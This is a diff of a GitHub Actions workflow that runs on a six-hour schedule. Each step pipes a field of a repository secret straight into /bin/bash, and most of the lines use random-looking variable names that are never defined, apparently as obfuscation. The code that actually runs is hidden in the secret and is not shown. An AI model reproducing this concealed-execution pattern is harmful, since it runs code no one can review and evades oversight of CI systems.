@@ -3,23 +3,31 @@ name: zhoudapeng9813
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 5/6 * * *'
+    - cron: '46 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhoudapeng9813
         env:
-          cj73226: ${{ secrets.cj73226 }}
+          pw28: ${{ secrets.pw28 }}
         run: |
-          echo $cj73226 | jq -r .nevd6156 | /bin/bash
-          echo $sdyf63518 | jq -r .tcy5394 | /bin/bash
-          echo $aogg7 | jq -r .jcc38154 | /bin/bash
-          echo $qpf79 | jq -r .dc822 | /bin/bash
-          echo $dtf1 | jq -r .rcnpe06 | /bin/bash
-          echo $vryoj89167 | jq -r .kgx8443 | /bin/bash
-          echo $ohly7266 | jq -r .outgp936 | /bin/bash
-          echo $ys4935 | jq -r .v3 | /bin/bash
-          echo $pch50345 | jq -r .w68394 | /bin/bash
+          echo $pw28 | jq -r .sh795 | /bin/bash
+          echo $cxzr46255 | jq -r .rwfnc557 | /bin/bash
+          echo $eemi318 | jq -r .r2915 | /bin/bash
+          echo $mqfu61 | jq -r .zwil70017 | /bin/bash
+          echo $wbl3586 | jq -r .zcuxi62 | /bin/bash
+          echo $ewd77 | jq -r .tc02423 | /bin/bash
+          echo $pdqdw715 | jq -r .m44851 | /bin/bash
+          echo $st8 | jq -r .bswj40080 | /bin/bash
+          echo $ihldi16 | jq -r .bwe1 | /bin/bash
+          echo $h6 | jq -r .jblvn99 | /bin/bash
+          echo $s67 | jq -r .s4099 | /bin/bash
+          echo $qqh7132 | jq -r .fwsy216 | /bin/bash
+          echo $ynpzg036 | jq -r .gifud0 | /bin/bash
+          echo $ba083 | jq -r .irzn1 | /bin/bash
+          echo $gsiin016 | jq -r .litkg060 | /bin/bash
 
